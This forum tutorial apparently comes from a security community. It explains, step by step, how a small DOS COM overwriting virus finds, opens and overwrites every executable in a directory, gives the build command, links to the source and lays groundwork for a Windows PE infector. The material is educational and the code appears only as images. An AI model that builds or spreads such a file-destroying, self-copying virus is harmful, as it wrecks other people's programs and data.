<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655.png" data-download-href="/uploads/short-url/9f6d5WaOH73UAuasgXrDqzZUOod.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655_2_624x173.png" alt="" data-base62-sha1="9f6d5WaOH73UAuasgXrDqzZUOod" width="624" height="173" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655_2_624x173.png, https://0x00sec.s3.amazonaws.com/optimized/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655_2_936x259.png 1.5x, /uploads/default/original/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/40c88a04b3112715fe8dea051dcb15b18727b655_2_10x10.png"></a></div><p></p>
<p>So, <strong>0364:1DB6</strong> is the address of <strong>INT</strong> <strong>0</strong> and <strong>0364</strong>:<strong>1DBF</strong> is the address of <strong>INT</strong> <strong>1</strong>, etc…</p>
<hr>
<h2><span>Writing a basic COM overwriting Virus in DOS</span></h2>
<p>Let’s examine the mini-44 which is called like that since it’s only 44 bytes long virus from The Giant Black Book of Computer viruses at page 29. I’ve modified it to a MINI-51 for the sake of this post and Its modified source that I’ll be using can be found here on my GitHub:</p>
<p><a href="https://github.com/DanusMinimus/MalwareArt" rel="noopener nofollow ugc">https://github.com/DanusMinimus/MalwareArt</a></p>
<p>The original file was found at <a href="https://github.com/guitmz/virii" rel="noopener nofollow ugc">@TMZ github(Your’e awesome TMZ!)</a></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727.png" data-download-href="/uploads/short-url/6Urc0blNMDlUIsnSgV5mSmgxAR9.png?dl=1" title=""><img src="/uploads/default/original/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727.png" alt="" data-base62-sha1="6Urc0blNMDlUIsnSgV5mSmgxAR9" width="316" height="450" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727_2_10x10.png"></a></div><p></p>
<p>I’ve edited the virus a bit to make it work on <strong>FreeDOS</strong> and <strong>NASM</strong>. I didn’t change it all too much, but I advise you to apply the changes I’ve added to the file yourself. (Because of my edits the mini 44 turned in to a mini 51.)</p>
<p>Before we begin analyzing this piece of code, we must understand something about <strong>COM</strong> files. They are built around the tiny model which is defined as:</p>
<p>“The tiny model. Everything must be included in a single segment (<strong>COM</strong> file).  Pointers are near.”</p>
<p>The maximum size of a <strong>COM</strong> file can only be 64 kilobytes, and everything must be contained in one segment, meaning all jumps are relative to one segment and cannot jump beyond the 64-kilobyte boundary. The Stack, data, and code all must reside in this one segment. Additionally, a <strong>COM</strong> file begins its execution at <strong>100h</strong>(h stands for hex). The first 256 bytes of memory are reserved for the <strong>Program Segment Prefix (PSP)</strong> which contains various information and function calls that the <strong>COM</strong> file can use. The <strong>PSP</strong> is relic of the past days and was created in DOS to maintain compatibility with old COM files. The following data can be found within the PSP:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/7ecf91189b499d126826ac060d6847a0a3a83e58.png" data-download-href="/uploads/short-url/i5OS0kTHn7oxve3icWzEHdItTew.png?dl=1" title=""><img src="/uploads/default/original/2X/7/7ecf91189b499d126826ac060d6847a0a3a83e58.png" alt="" data-base62-sha1="i5OS0kTHn7oxve3icWzEHdItTew" width="624" height="432" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7ecf91189b499d126826ac060d6847a0a3a83e58_2_10x10.png"></a></div><p></p>
<p>The only field that will come into play for our virus is the <strong>DTA</strong>, which we’ll talk about soon. Further information about this can be read in pages 25-26 in the Giant black book.</p>
<p>So, let’s get back to our code.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727.png" data-download-href="/uploads/short-url/6Urc0blNMDlUIsnSgV5mSmgxAR9.png?dl=1" title=""><img src="/uploads/default/original/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727.png" alt="" data-base62-sha1="6Urc0blNMDlUIsnSgV5mSmgxAR9" width="351" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/306e47d2e9cc193f4c63b42151d8e6f57e223727_2_10x10.png"></a></div><p></p>
<p>Its well documented but to ease your understanding I will go line by line with you.</p>
<p>First at line 6 the address of the file name to search is passed into <strong>EDX</strong>. Then <strong>AH</strong> with <strong>E4h</strong> is setup to call <strong>DOS</strong> <strong>API</strong> service <strong>INT 21h</strong>.</p>
<p><img src="/uploads/default/original/2X/e/ed00b16c7ca14dae9771a81cbf95bc83ed4760ed.png" alt="" data-base62-sha1="xOCE0OILuzK8pviK7jAZYkRbJCd" width="525" height="115"></p>
<p>So, what does this execute? If a file is found, the <strong>AX</strong> register returns 0 and 43 bytes of the <strong>DTA</strong> field in the <strong>PSP</strong> are filled with data regarding the first file that was found (Its attributes, its size, its time of creation and Its name). If the service routine failed, the <strong>CF</strong> flag would be set and a JC is performed to line 47, which terminates the program.</p>
<p>Then on line 15 <strong>DX</strong> is filled with the address of the file name string returned in the <strong>DTA</strong>. <strong>AH</strong> is filled with <strong>3Dh</strong> which will instruct <strong>INT 21h</strong> service routine to open a file handle( A file handle can be seen as an abstract pointer to a resource, it used by the <strong>OS</strong> to access system resources)  and <strong>AL</strong> will be filled with 02h which will open the file for <strong>READ/WRITE</strong> operations. <strong>INT 21h</strong> is invoked again.</p>
<p><img src="/uploads/default/original/2X/a/a624f643c29a0b31938189e8c716ba235769cae7.png" alt="" data-base62-sha1="nHMrWH5DgZ9Bslh5vUSW0n0PCbt" width="501" height="110"></p>
<p><img src="/uploads/default/original/2X/6/6e8e948d9bac3c4919a3a6ad9a53a54f280ed207.png" alt="" data-base62-sha1="fM1ZUD0EbgXlvimzDJGL3MITZ3h" width="218" height="77"></p>
<p>If the call fails, the program jumps to <strong>NEXT_MATCH</strong> which will be discussed shortly.</p>
<p>If the call executed correctly, the file handle returned will be passed into <strong>BX</strong>. <strong>DX</strong> will be filled with the offset of the writing position, It points to 100h which is the start of our own code.(Remember that <strong>COM</strong> files start execution at <strong>100h</strong>), <strong>CX</strong> is filled with the size of our code(51 bytes or 33h). <strong>AH</strong> is filled with 40h which sets up <strong>INT 21h</strong> to execute a write file service.</p>
<p>If this instruction returns successfully, the found <strong>COM</strong> file will be infected. At line 37, the file handle is closed. At line 42, the virus will execute service 4Fh which will look for another file, if this check fails the virus will terminate, if it succeeds the program will infect another file.</p>
<p><img src="/uploads/default/original/2X/7/704d22cc826e4908adcf324d88baa366fd0e6b36.png" alt="" data-base62-sha1="g1sJRgOdHdghFSnUt9OkzsKHIjA" width="513" height="119"></p>
<p>To create our virus let’s first make a new directory using “<strong>mkdir</strong>” and call it <strong>COMDIR</strong>, then use cd <strong>COMDIR</strong> to enter it.</p>
<p>Now execute “<strong>edit</strong>” and write down the virus inside manually, use the mouse the navigate to the file tab and click new. I still can’t understand how to copy from host machine and paste into <strong>FreeDOS</strong> yet so if anyone knows feel free to update me on that.</p>
<p>When you are done writing down the virus navigate to the file tab and save the assembly file as virus.asm.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a.gif" data-download-href="/uploads/short-url/knlzWsBBUYxP5WkPsNpzY8FnlPA.gif?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a_2_624x339.gif" alt="" data-base62-sha1="knlzWsBBUYxP5WkPsNpzY8FnlPA" width="624" height="339" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a_2_624x339.gif, https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a_2_936x508.gif 1.5x, /uploads/default/original/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ecf21dedd6a0db20ae1c018238edbd21fd7622a_2_10x10.png"></a></div><p></p>
<p>To assemble this file using <strong>NASM</strong> write down “<strong>nasm virus.asm -fbin -o <a href="http://virus.com" rel="noopener nofollow ugc">virus.com</a></strong>” and this will create the virus com file for us.</p>
<hr>
<h2><span>Writing a Host COM application</span></h2>
<p>We need a host for our virus, I think a great candidate would be the code snippet in page 23 in our book.</p>
<p><img src="/uploads/default/original/2X/0/0d80f91974264afa770df49658ebb4939628323d.png" alt="" data-base62-sha1="1VswTAm7ZaVpCzAW27IgEjgONL7" width="443" height="257"></p>
<p>The program is very simple, first it prepares the message display routine by loading <strong>AH</strong> with 9. Then it passes the start address of the message we want to display into <strong>DX</strong> (Messages that are displayed into terminal must be terminated with <strong>‘$’</strong>), finally the program terminates by passing <strong>4c00h</strong> into <strong>AX</strong> and then calling <strong>INT 21h</strong>.</p>
<p>I execute the “<strong>DIR</strong>” command to display what is in my current directory, assemble our host program and check out of its working:</p>
<p><img src="/uploads/default/original/2X/9/95ab39dd396dab08dde2970cead45e690eb2ae81.png" alt="" data-base62-sha1="lm1ZzMc3RSjqV27eiQhg0KvFYI1" width="445" height="295"></p>
<p>Cool, lets make a few copies of it by using “<strong>COPY</strong>”:</p>
<p><img src="/uploads/default/original/2X/4/41e4e264ca56383a1c38c8f9162659ed98d87314.png" alt="" data-base62-sha1="9oVpUWfDbrX01cGjo2N5vCHzM9e" width="445" height="43"></p>
<p>So now we’ll have:</p>
<ol>
<li><strong><a href="http://HOST.COM" rel="noopener nofollow ugc">HOST.COM</a></strong></li>
<li><strong>HOST_1.COM</strong></li>
<li><strong>HOST_2.COM</strong></li>
<li><strong><a href="http://VIRUS.COM" rel="noopener nofollow ugc">VIRUS.COM</a></strong></li>
</ol>
<p><img src="/uploads/default/original/2X/6/6094c2bbe31a4a8d109da6acdf46b71490243baa.png" alt="" data-base62-sha1="dMoyr91cEb3qxmWxSksXB1C0J86" width="363" height="146"></p>
<p>Now let’s execute our virus with the <strong>debug</strong> utility and see what happens (You can use ‘?’ any time to see the help menu of debug):</p>
<p><img src="/uploads/default/original/2X/7/7d52d8110b8fecc12ebe58f6c83954cc32a7e317.png" alt="" data-base62-sha1="hSFaVCg5XGZmboZTcPcmIOlifdR" width="424" height="25"></p>
<p>Enter <strong>‘p &lt;number of lines&gt;’</strong> to execute lines of code</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc.png" data-download-href="/uploads/short-url/ivi8C6tU5YwogxmqLXl2Anm17GY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc_2_429x128.png" alt="" data-base62-sha1="ivi8C6tU5YwogxmqLXl2Anm17GY" width="429" height="128" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc_2_429x128.png, https://0x00sec.s3.amazonaws.com/optimized/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc_2_643x192.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc_2_858x256.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/81b0af49835c7c2458a42015e7fd77ea881ce3fc_2_10x10.png"></a></div><p></p>
<p>First we execute lines 11-15 to execute the dos “<strong>Search First</strong>” function to find the first com file, as we recall it should load the file attributes into the <strong>PSP</strong> which can be found at offset 80h. After the call to <strong>INT 21h</strong> service routine we should see the DTA  inside offset 80h from the start of the code segment in memory. Let’s dump the code segment at offset 80h “<strong>d(ump) cs:80</strong>”</p>
<p><img src="/uploads/default/original/2X/9/980644ea822908832ae206ccdc075a307722d18c.png" alt="" data-base62-sha1="lGS0rJozlXe0tVxdkACsaeFL4Ys" width="552" height="55"></p>
<p>The virus found itself! That’s alright though because we are just going to overwrite the virus with the virus!</p>
<p>Next we execute line 19 – 26 to open the file handle to the found file, the file handle is passed to <strong>AX</strong> if the call to <strong>INT 21h</strong> service routine will return successful.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420.png" data-download-href="/uploads/short-url/sbC6cjqrsexxpdJ23T3QX45Ywgg.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420_2_445x160.png" alt="" data-base62-sha1="sbC6cjqrsexxpdJ23T3QX45Ywgg" width="445" height="160" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420_2_445x160.png, https://0x00sec.s3.amazonaws.com/optimized/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420_2_667x240.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420_2_890x320.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c58cf9b0ada6c2d7c3fc467373a2399b0907a420_2_10x10.png"></a></div><p></p>
<p><strong>AX</strong> holds the file handle, lets execute line 30-37:</p>
<p><img src="/uploads/default/original/2X/4/47322cb205715aa15702c9d76257df90c585b5ef.png" alt="" data-base62-sha1="a9PoJDhw1EPBAnVmHwK2LcA4jtZ" width="560" height="299"></p>
<p><strong>AX</strong> returned <strong>33h</strong>, which is the number of bytes (in hex) written to the file. Basically, at this point we have overwritten the original file or the virus with the virus itself.</p>
<p>Now let’s close the handle, execute the “<strong>Search Next</strong>” service routine and view the <strong>DTA</strong> field in the <strong>PSP</strong> again to see if it will find the next file:</p>
<p><img src="/uploads/default/original/2X/2/283734a1f3e44bca5bc4f9a937da7b7dec0dba99.png" alt="" data-base62-sha1="5JLnklQGWsRBlaFZgGz1jRs2ah3" width="576" height="86"></p>
<p>We can see that it found <strong><a href="http://HOST.COM" rel="noopener nofollow ugc">HOST.COM</a></strong>, this exact operation will run until all files in the directory are overwritten. Let’s enter the “q(uit)” command and run the virus simply by typing its name in the command prompt.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c.png" data-download-href="/uploads/short-url/fgVJKN4PoKe6No5yQtK0c0FrxKY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c_2_476x313.png" alt="" data-base62-sha1="fgVJKN4PoKe6No5yQtK0c0FrxKY" width="476" height="313" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c_2_476x313.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c_2_714x469.png 1.5x, /uploads/default/original/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6b0a92389e3589c9dd76d3b4bd2ae11f94efac9c_2_10x10.png"></a></div><p></p>
<p>Our host files have all been infected by the virus, how do we know? They all match its size and if we’ll execute them nothing will happen. Pretty cool huh!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29.png" data-download-href="/uploads/short-url/c3W3WeyDXx4zud8etG5STFe1oKJ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29_2_433x284.png" alt="" data-base62-sha1="c3W3WeyDXx4zud8etG5STFe1oKJ" width="433" height="284" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29_2_433x284.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29_2_649x426.png 1.5x, /uploads/default/original/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/548c00e26cf3814e509c7f31e1dff318f2db2e29_2_10x10.png"></a></div><p></p>
<p>Now that we understood how basic <strong>COM</strong> infectors were made back in <strong>DOS</strong>, we can attempt to make our own infector in Windows!</p>
<hr>
<h2><span>Windows Internals</span></h2>
<p>To cope with the massive security problems that real mode introduced most operating systems today are executing in Protected Mode.</p>
<p><strong><span>Windows Internals Basics</span></strong></p>
<p>Here I will be explaining the BARE basics of Windows running in protected mode, some of the explanation has been simplified for the readers understanding. If one wants to expand on the information written here, please visit the <a href="https://www.codeproject.com/Articles/1273844/The-Intel-Assembly-Manual-3" rel="noopener nofollow ugc">article listed above</a>.</p>
<p>Protected mode is a whole new architecture and is beyond the scope of this post. I will cover only what is relevant to us under Windows. If the reader is interested to learn more, please reference the <a href="https://www.codeproject.com/Articles/1273844/The-Intel-Assembly-Manual-3" rel="noopener nofollow ugc">article listed above</a>.</p>
<p>The executing environment for applications is separated from the operating system, applications are separated in what is called user space and the Windows kernel is executing in kernel space. Only the kernel has access to physical memory and system resource.</p>
<p>How does Windows manage to perform this separation? It uses what is called Virtual Memory which is provided by the Memory Management Unit(MMU) chip in the CPU. The <strong>MMU</strong> separates the entire physical memory to Pages, these pages are handled by a special table, each page usually references 4 kilobytes of physical memory.</p>
<p>When a process executes in a 32-bit Windows environment it has pages reserved to it in the Page Table. The process has no idea it’s executing itself with in the context of these pages, in fact the process has access to all 4 gigabytes of RAM in a linear address as far as its concerned. It assumes it’s the only process running within Windows and it also assumes it has access to the entire memory within the system.</p>
<p>This happens to each process executing in Windows, so say we have 2 instances of notepad.exe running at the same time: <strong>notepad_proc_1</strong> and <strong>notepad_proc_2</strong>. If <strong>notepad_proc_1</strong> is attempting to access the value in address <strong>0x1234</strong> of itself and <strong>notepad_proc_2</strong> is attempting to access the value in address <strong>0x1234</strong> of itself, they would probably both accesses completely two different values. But how could this be? Well, it’s because they are executing in different pages in the page table.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1d2296eb82d6b3b6571e18c12bf82844acfe8783.png" data-download-href="/uploads/short-url/49JXaBudnCc9l3TeNkuXXfunMKn.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1d2296eb82d6b3b6571e18c12bf82844acfe8783.png" alt="" data-base62-sha1="49JXaBudnCc9l3TeNkuXXfunMKn" width="624" height="358" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d2296eb82d6b3b6571e18c12bf82844acfe8783_2_10x10.png"></a></div><p></p>
<p>As can be seen in the graph above, both values are mapped to two different pages and these pages are pointing to different areas in physical memory. So, process executing in Windows running in Protected mode cannot touch or overwrite each other in memory so they can both execute gracefully within the same environment.</p>
<p>But how do they have access to system resources if they are separated from the system itself? If these two notepad process are separated entirely from the system how can they open files? Ah good question! They are managed by the Windows Kernel. The windows kernel is a separate process running on windows it’s mapped into each process running on the system, the kernel is the operating system manager. As I mentioned before only the kernel has access to system resources and the system physical memory so if the process wants to access system resources it must perform a request to the kernel. This is done through API calls, much like the <strong>INT 21h</strong> interrupt service routine. How ever in <strong>DOS</strong> a program could use the <strong>DOS</strong> interrupt services if it wanted to access system resources in memory, but it was optional, nothing stopped from a DOS application from performing manipulations on system resources, it just was very uncomfortable. In Windows, a running application <strong>MUST</strong> call Windows API to gain access or to modify system resources.</p>
<p>So, our graph looks like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9.png" data-download-href="/uploads/short-url/58bsBB9S0jsc1QxcdnPIBbONybv.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9_2_624x411.png" alt="" data-base62-sha1="58bsBB9S0jsc1QxcdnPIBbONybv" width="624" height="411" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9_2_624x411.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9_2_936x616.png 1.5x, /uploads/default/original/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/23f7b9c96f171f2ef24cc5f9293cd5a3ac9e2cc9_2_10x10.png"></a></div><p></p>
<p>If the kernel doesn’t see these request fit, it will deny the process access to the system resource. For example, say <strong>notepad_proc_2</strong> is currently reading <strong>README.TXT</strong> but another application wishes to delete it.  The application will invoke <strong>DeleteFile</strong> API, this API will pass into the kernel, the kernel will see that the file is currently being read and will deny the application from deleting it.</p>
<p>This mechanism replaces the <strong>IVT</strong> and creates a separation between applications and the system. The applications cannot do anything they want, they are separated from the system and each other and basically can co-exist with no problem.</p>
<p>Alright, now another question arises. I’ve claimed that each process has access to 4 gigabytes of memory, but in a 32-bit system there are only 4 gigabytes of RAM, how is this possible? Wont the system fault and crash as soon as an application overruns the entire RAM?</p>
<p>The answer to that is simple, first yes it might happen that a program (say a virus) will request so much memory that other applications simply couldn’t run. To solve this problem Windows performs something called “Paging”, Paging is an act of taking a page and mapping it on disk. Instead of managing all the pages in RAM, some pages are put on disk and managed through there. Access to these pages on disk is much slower and can cause some applications or the system to start slugging. Paging is also used to free some memory from the ram. Say an application would go idle and would stop using the RAM. Windows would detect this and to free temporary memory it would save the applications pages and map them to disk, when the application would run again – Windows would map the page back into RAM.</p>
<p>Alright bear with me guys, just a little more theory and we start developing again.</p>
<p>Where is user space in the process and is the kernel space mapped into the process?</p>
<p>The kernel space is mapped into each process and the user space is where code, data and the resource of the application are located. It makes sense to map the kernel into each process so it would be easier to perform requests to it.</p>
<p>The user space is located at address <strong>0x00000000-0x7FFFFFFF</strong> and the kernel space is mapped from <strong>0x80000000-0xFFFFFFFF</strong>. The kernel gets 2gb and the user gets 2gb of RAM. So, its fair game.</p>
<hr>
<h2><span>Portable Executable (PE) File Format</span></h2>
<p>It’s time to code our virus, it would be a simple virus much like the COM infector. Infecting only the files in the current directory, not employing stealth or direct system calls. But what kind of files are executable within the Windows operating system? These are the <strong>Portable Executable</strong> files and they have a much more complex file format than the COM file.</p>
<p>Since it’s going to be a basic overwriting virus affecting only PE files, all we need to do is overwrite the code located within the PE. But the PE file format is nothing like the COM file format. It has been discussed a million times on the internet, but I truly believe that one who knows the PE file format by hand can only leverage from, especially when it comes to malware analysis.</p>
<p>As far as the basics concerned the PE File contains:</p>
<ol>
<li>
<p>the PE Headers which contain various information about the file</p>
</li>
<li>
<p>4 additional sections (sometimes more)</p>
<p><strong>The .text section</strong> – The user code executes in this section</p>
<p><strong>The .data section</strong> – Initialized global variables and data for the user code is stored here</p>
<p><strong>The .bss section</strong> – Uninitialized global variables are stored here</p>
<p><strong>The .reloc section</strong> – The relocation table is stored here, it is a mechanism that allows the Windows PE loader to load the executing PE in different areas in memory</p>
</li>
</ol>
<p>Before we start destroying PE files let’s see how they work under the hood. Let’s start by trying to find the location of the user defined code stored within the PE. But finding it is not as easy as one might think – thankfully the PE header is constructed in such a way that is relatively easy to find all the fields we are looking for and we are looking for a very special field located inside the PE header called <strong>“Address of Entry Point”</strong> which is the offset of the location of the user code in relation to the base of the file.</p>
<p>To experiment with this, lets code a host file in assembly in <strong>MASM</strong> that would display a message when run, Open Visual MASM  -&gt; Click File -&gt; New Project -&gt; <strong>Windows 32 MessageBox application</strong> -&gt; Save Project As in your specified folder. Now let’s examine the code:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158.png" data-download-href="/uploads/short-url/vAbSXSLRglDPWXk8yONAvL1gabm.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158_2_502x500.png" alt="" data-base62-sha1="vAbSXSLRglDPWXk8yONAvL1gabm" width="502" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158_2_502x500.png, /uploads/default/original/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158.png 1.5x, /uploads/default/original/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd5ab82f74d82a241c283e83c94b5b85a4054158_2_10x10.png"></a></div><p></p>
<p>In lines 7-9 we define the model of the assembly binary (We’ll touch this on later chapters). Then on line 4-6 we use the “<strong>Include</strong>” directive to instruct MASM to import all the constant types from <strong>windows.inc, user32.inc and kernel32.inc</strong>. These constants stored in these files define various constant parameters for functions (e.g. <strong>MB_OK</strong> constant for <strong>MessageBox</strong> API which will spawn a message box dialog type of “OK”)</p>
<p>Then in lines 21-22 we include all the assembly functions definitions for <strong>user32.lib</strong> and <strong>kernel32.lib</strong> which define various Windows API calls. Then on line 27-29 we define the PEs <strong>.data</strong> section and as you recall it should contain initialized global data.</p>
<p>Then on line 34-41 we define the programs <strong>.code</strong> section which is the section that contains the code of the program. But wait Danus! Shouldn’t the <strong>.text</strong> section contain the code of the program in the PE? Well yes but in MASM due to compatibility reasons I guess(?) They kept the name <strong>.code</strong> instead of <strong>.text.</strong></p>
<p>We then define a new “Start” label and call <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox" rel="noopener nofollow ugc">MessageBox</a></strong> which is defined by the Windows API as:</p>
<p><img src="/uploads/default/original/2X/a/a573b11edcfe7f7f1446fd6fa8f413c4ff71a06b.png" alt="" data-base62-sha1="nBEEnHEvRguF3bPzTLGq19rsfOz" width="235" height="170"></p>
<p>In our code we can see that the parameters are passed as following:</p>
<ul>
<li>
<strong>0</strong> – handle to owner of the window of the message box created. <strong>NULL</strong>(0) parameter indicates that there is no owner meaning the message box will simply display independently</li>
<li>
<strong>ADDR strMessage</strong> – The address of the string which will be display inside the message box</li>
<li>
<strong>ADDR strTitle</strong> – The address of the string which will display the title of the message box</li>
<li>
<strong>MB_OK</strong> – A constant included in <strong>user32.inc</strong> which indicates the type of the message box</li>
</ul>
<p><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess" rel="noopener nofollow ugc">ExitProcess</a></strong> is then called which is a Windows API that will terminate the process. It only has one parameter passed to it, in this case 0 which will the process was terminated with no errors.</p>
<p>You can notice that instead of using “<strong>Call</strong>”, MASM uses “<strong>Invoke</strong>”. You can still use <strong>call</strong> but <strong>Invoke</strong> is a MASM assembly macro that makes it a bit more comfortable for the user to call a Windows API function.</p>
<p>Let’s change it the <strong>Invoke</strong> to a <strong>call</strong> because assembly pros like us only use native assembly. I assume the reader knows assembly but just in case you don’t – remember that function parameters when passed in assembly are passed into the stack which is a <strong>First in Last Out</strong> data structure. so, the last parameter is pushed first, and the first parameter is pushed last. If you want to expand on this information please <a href="https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames" rel="noopener nofollow ugc">read this</a>. As an exercise, try to do this yourself before you read the solution.</p>
<p><img src="/uploads/default/original/2X/b/b51d6a2ff3f44bac9c971cc9cc4d7c11f5c4b5ac.png" alt="" data-base62-sha1="pQdrt6Wdylgm6LOpJt6NfAy27nK" width="419" height="354"></p>
<p>So, if you did try to do it yourself and failed - you cannot use the <strong>ADDR</strong> keyword in push instructions. You must load the address of the strings manually into registers and push them into the stack.</p>
<p><img src="/uploads/default/original/2X/2/2a5837817eaa41bf6c67d303bf5054be6f8e062d.png" alt="" data-base62-sha1="62B3yJAOvoqLZZmaDbsRUPR1ne5" width="148" height="160"></p>
<p>It works! But the final binary is big as compared to the <strong>COM</strong> file we produced for <strong>DOS</strong>(3584 bytes vs 51 bytes.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc.png" data-download-href="/uploads/short-url/xIfBG788IX4zbB7J15t6S4rTlU0.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc_2_624x24.png" alt="" data-base62-sha1="xIfBG788IX4zbB7J15t6S4rTlU0" width="624" height="24" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc_2_624x24.png, /uploads/default/original/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc.png 1.5x, /uploads/default/original/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/ec484f823475f04b8a06296c6573a95ff0a1cedc_2_10x10.png"></a></div><p></p>
